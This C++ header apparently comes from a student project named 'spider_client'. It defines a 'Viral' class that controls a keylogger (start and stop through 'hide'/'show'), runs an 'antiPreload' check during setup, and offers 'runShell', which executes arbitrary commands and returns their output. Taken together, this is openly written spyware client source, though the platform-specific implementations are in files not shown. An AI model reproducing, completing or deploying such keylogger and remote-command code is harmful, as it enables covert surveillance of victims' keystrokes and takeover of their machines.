/*
** Viral.hpp for spider_client
**
** Made by King
** Login   <arthur.cros@epitech.net>
**
** Started on  Fri Sep 29 17:46:11 2017 King
**
*/

#ifndef SPIDER_CLIENT_VIRAL_HPP
#define SPIDER_CLIENT_VIRAL_HPP

#include <boost/process.hpp>
#include <KeyLogger/KeyLogger.hpp>
#include "Configuration.hpp"

#if defined(USING_LINUX)
#include <Viral/details/LinuxViral.hpp>
#elif defined(USING_OSX)
#include <Viral/details/OSXViral.hpp>
#elif defined(USING_WINDOWS)
#include <Viral/details/WindowsViral.hpp>
#else
#error Unsupported platform
#endif

namespace spi
{
    class Viral : details::ViralImpl
    {
    public:
        Viral() = default;

        virtual ~Viral() noexcept
        {
            _log(logging::Info) << "Shutting down" << std::endl;
        }

        void hide() const noexcept
        {
            _keylogger->stop();
        }

        void show() const noexcept
        {
            _keylogger->run();
        }

        bool setup(KeyLogger *keylogger) noexcept
        {
            if (!antiPreload())
                return false;
            _keylogger = keylogger;
            _log(logging::Info) << "Successfully initialized" << std::endl;
            return true;
        }

        std::string runShell(const std::string &cmd) noexcept
        {
            namespace bp = boost::process;
            bp::ipstream is;
            bp::child c(cmd, bp::std_out > is);

            std::stringstream ss;
            std::string line;

            while (c.running() && std::getline(is, line) && !line.empty()) {
                ss << line << "\n";
            }

            c.wait();
            return ss.str();
        }


    private:
        KeyLogger *_keylogger{nullptr};
    };
}
#endif //SPIDER_CLIENT_VIRAL_HPP
